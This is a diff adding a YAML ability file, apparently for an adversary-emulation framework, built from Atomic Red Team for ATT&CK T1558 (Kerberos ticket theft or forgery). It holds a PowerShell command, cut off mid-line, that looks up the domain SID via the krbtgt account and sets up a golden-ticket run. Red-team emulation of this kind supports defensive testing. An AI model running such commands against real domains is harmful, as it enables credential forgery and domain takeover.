@@ -1,0 +1,22 @@
+- id: 26fc2d1a-30a4-4310-9e4d-1dd40af571c8
+  name: Steal or Forge Kerberos Tickets
+  description: Ability for Steal or Forge Kerberos Tickets (ATT&CK T1558). Generated
+    from Atomic Red Team procedures; review and test safely before use.
+  tactic: credential-access
+  technique:
+    attack_id: T1558
+    name: Steal or Forge Kerberos Tickets
+  platforms:
+    windows:
+      psh:
+        command: 'Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore Remove-Item
+          $env:TEMP\golden.txt -ErrorAction Ignore # get current domain SID if default
+          was used $domain_sid = "#{domain_sid}" If ($domain_sid -Match "DEFAULT")
+          { # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
+          $domain = gwmi Win32_ComputerSystem | Select -Expand Domain $krbtgtSID =
+          (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
+          $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf(''-'')) } #
+          create batch file with commands to run in a separate "runas /netonly" session
+          # so we don''t purge Kerberos ticket from the current Windows session #
+          its output goes to golden.txt temp file, because we cannot capture "runas
+          /netonly" output otherwis …'
